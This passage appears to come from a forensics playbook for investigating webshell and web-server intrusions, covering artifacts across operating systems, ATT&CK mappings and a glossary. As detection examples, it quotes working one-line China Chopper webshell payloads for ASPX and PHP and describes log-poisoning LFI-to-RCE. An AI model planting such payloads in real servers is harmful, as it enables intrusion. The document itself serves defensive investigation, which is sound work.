- [ ] **Per-modality sweep** — every modality PRESENT in the evidence was processed, and every ABSENT one was recorded as absent (absence is a finding): disk file system · memory · event logs · registry · email stores · browser profiles · cloud-sync clients.
- [ ] **Every IOC pivoted** — each hash, path, filename, IP/domain, account, extension, and mutex found was pivoted back through the other modalities and the timeline.
- [ ] **Timeline built** — a case timeline exists and the committed story is consistent with it (entry → action → impact ordering holds, no unexplained gaps).
- [ ] **Anti-forensics checked** — cleared logs, timestomp, gaps, emptied artifact dirs: each ruled out or recorded as a finding.
- [ ] **Every theory closed** — each row of "Theories to test" is refuted with a receipt or carried forward with a confidence label.

**Quick-path success does NOT waive the Done gate.** The quick path exists to find the thread fast; this gate exists to guarantee nothing present went unread. The quick path itself must include a timeline-first move before any story is committed.
<!-- END CLOSE-GATE INVARIANT -->

## Cross-OS notes
- **Windows (IIS/.NET):** richest path — `$MFT`/`$UsnJrnl`, IIS `u_ex*.log` (parse with `iisGeolocate`/`bstrings`), Security 4688 under `IIS APPPOOL\*`/`w3wp.exe`. The web pool spawning `cmd`/`powershell` is the single strongest tell.
- **Linux (LAMP/Tomcat/nginx):** numbered branch above. No registry/MFT/EVTX — use `fls -m`+`mactime` for webroot/log birth times, `jls` for the ext journal, `icat`+`srch_strings` over `/var/log/{apache2,nginx,httpd}` and `auth.log`, and `.bash_history` of `www-data`/`root` for hands-on commands.
- **macOS web servers (rare):** TSK 4.11.1 APFS support is limited — `⚠️verify` before trusting `fls`/`fsstat` on APFS; `mac_apt.py` is BROKEN on this box (don't rely on it). Read webroot/log text via `srch_strings`/`bstrings` and confirm file times from carved metadata.
- **Cloud / perimeter appliances (WAF, ALB, VPN, firewall):** no dedicated parser on this box — investigate from *exported* access/audit logs already on disk by grepping with `srch_strings`/`bstrings`; appliance firmware images are often proprietary → `⚠️verify`, treat as lead-only.

## Real-case notes (non-obvious things to look for)
- **China Chopper is tiny — one line, easy to miss.** The classic webshell server-side payload is a single line (e.g. `<%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>` for .aspx, or `<?php @eval($_POST['pass']);?>` for PHP) under ~1 KB, so a size/anomaly sweep won't flag it — grep webroot scripts for `eval`+`Request`/`$_POST` instead. The traffic side is short obfuscated/base64 POST bodies to a normal-looking page. `[FireEye/Mandiant "Breaking Down the China Chopper Web Shell" · high]`
- **Hafnium/ProxyLogon dropped shells into known IIS paths after chained Exchange CVEs.** The 2021 Exchange wave (CVE-2021-26855 SSRF → 26857/27065) wrote `.aspx` shells into predictable dirs like `inetpub\wwwroot\aspnet_client\` and the OWA/ECP `auth`/`FrontEnd` folders, then operated via them — check those exact paths and the Exchange/IIS logs for the 26855 SSRF request pattern. `[Microsoft MSTIC / Volexity ProxyLogon · high]`
- **Webshell often lands in the upload/temp/cache dir, not the app root.** Insecure file-upload bugs write the shell wherever uploads go (`/uploads`, `/images`, `wp-content/uploads`, IIS temp) — a server-side script with execute permission in a *content* folder that should only hold images/docs is high-signal. `[OWASP "Unrestricted File Upload" · med]`
- **Log poisoning leaves no new file.** Attackers inject PHP into a field the server logs (User-Agent, a 404 path), then `include()` the access/error log via LFI — the malicious code lives inside the log, so a webroot file diff finds nothing. Read the *contents* of access/error logs for `<?php`/`eval` when an LFI is suspected. `[OWASP / PortSwigger LFI-to-RCE log poisoning · med]`
- **Perimeter appliances get exploited pre-auth and self-clear.** Recent VPN/edge-device intrusions (e.g. mass-exploited SSL-VPN/edge CVEs) commonly run pre-auth, drop a small persistence script, and prune the device's own logs — so on an appliance image, a *gap* or a freshly-recreated log is itself the lead; corroborate from external/upstream logs where possible. `[CISA edge-device advisories · med ⚠️verify exact CVE per case]`
- **The web user spawning a shell is the cleanest single signal.** A normal web app almost never launches `cmd.exe`/`/bin/sh`/`whoami`/`certutil`; a 4688 (Windows) or history/auth line (Linux) showing the web service account doing so is strong execution proof even before you find the shell file. `[MITRE ATT&CK T1505.003 / common DFIR reporting · high]`

## ATT&CK mapping
- T1190 · Initial Access · Exploit Public-Facing Application (the CVE/injection/upload entry) — steps 3, L2
- T1505.003 · Persistence · Server Software Component: Web Shell (the dropped script) — steps 1, 2, L1
- T1059 · Execution · Command and Scripting Interpreter (commands run via the shell) — steps 4, L3
- T1059.001 · Execution · PowerShell — step 4
- T1059.004 · Execution · Unix Shell — step L3
- T1505 · Persistence · Server Software Component (malicious module/plugin) — steps 1, 5
- T1136.001 · Persistence · Create Account: Local Account (operator adds a user) — step 5
- T1543 · Persistence · Create or Modify System Process (service / systemd unit) — steps 5, L3
- T1070 · Defense Evasion · Indicator Removal (log deletion/truncation) — steps 7, L3
- T1070.002 · Defense Evasion · Clear Linux or Mac System Logs — step L3
- T1491.001 · Impact · Internal/External Defacement — step 6
- T1133 · Initial Access · External Remote Services (exposed VPN/RDP/appliance) — step 5
- T1105 · Command and Control · Ingress Tool Transfer (certutil/wget/curl pull) — steps 4, L3

## Pivots (lead-to-lead graph)
- `on_second_stage_binary_pulled: malware-analysis-triage — a downloaded PE/ELF tool needs static/behavioral triage`
- `on_host_command_execution: windows-execution-artifacts — pivot to amcache/shimcache/userassist to corroborate what ran`
- `on_security_event_leads: windows-event-logs — deepen the 4688/4624/7045 logon-and-service analysis`
- `on_new_account_or_persistence: windows-registry-persistence — chase Run keys/services that survive reboot`
- `on_lateral_movement_from_web_host: active-directory-domain — the web box was a foothold into the domain`
- `on_data_staged_or_copied_out: insider-threat-data-theft — the actor exfiltrated data through the foothold`
- `on_log_or_appliance_only_evidence: linux-host-forensics — deepen Linux/ESXi server-side artifact analysis`
- `on_pcap_in_evidence: network-forensics — reconstruct the request/response and any C2 on the wire`
- `on_unclear_origin: SELF — re-enter with the new IOC bound into #{variables}/#{time_window}`

## Jargon decoder
- **Webroot:** the folder a web server publishes to the internet (`C:\inetpub\wwwroot`, `/var/www/html`, Tomcat `webapps`). Anything an attacker writes here can be triggered by visiting its URL.
- **Webshell:** a small server-side script (PHP/ASPX/JSP) that runs whatever commands the attacker sends in a web request — a backdoor reached through a browser.
- **China Chopper / WSO / c99:** well-known public webshell families; their code carries recognizable markers (one-line `eval(Request[...])`, or large `WSO`/`c99` panels).
- **POST / GET:** the two common HTTP request types; a POST carries a body — file uploads and shell commands usually ride in a POST.
- **Path traversal (`../`, `%2e%2e`):** tricking the server into reaching files outside the webroot (e.g. `/etc/passwd`).
- **SQL injection (`union select`):** smuggling database commands through an input field.
- **LFI / log poisoning:** Local File Inclusion — making the app `include()` a file it shouldn't; "log poisoning" plants code in a log line and then includes that log to run it.
- **w3wp.exe / IIS APPPOOL:** the Windows IIS worker process and the low-privilege identity it runs as; if *it* launches `cmd.exe`, that's the web app being abused.
- **www-data / apache / tomcat:** the low-privilege Linux accounts web servers run as; commands by these users point at a web foothold.
- **$MFT / $UsnJrnl:$J:** NTFS's master file index / its change journal — together they show when a file (a webshell, a log) was created, renamed, or deleted.
- **ext journal (`jls`):** the Linux ext3/4 file-system journal — recent file transactions, useful when logs are gone.
- **IIS `u_ex*.log`:** the standard IIS access-log filename (W3C format); `iisGeolocate` maps its client IPs.
- **Defacement:** replacing the public page with attacker content (a tag, a message, propaganda).
- **Perimeter device:** an internet-facing appliance (firewall, VPN, load-balancer, mail gateway) that sits at the network edge.
- **Super-timeline:** a single merged chronology across many artifacts, built by `log2timeline.py` + `psort.py`.
- **yara-python:** the YARA signature engine as a Python library (used by `pe-scanner`/`page-brute`); there is no standalone `yara` command on this box.

## Tuning log (append-only — the eval loop writes here; humans never edit rows)
| date | case_id | bucket missed | delta applied |
|---|---|---|---|
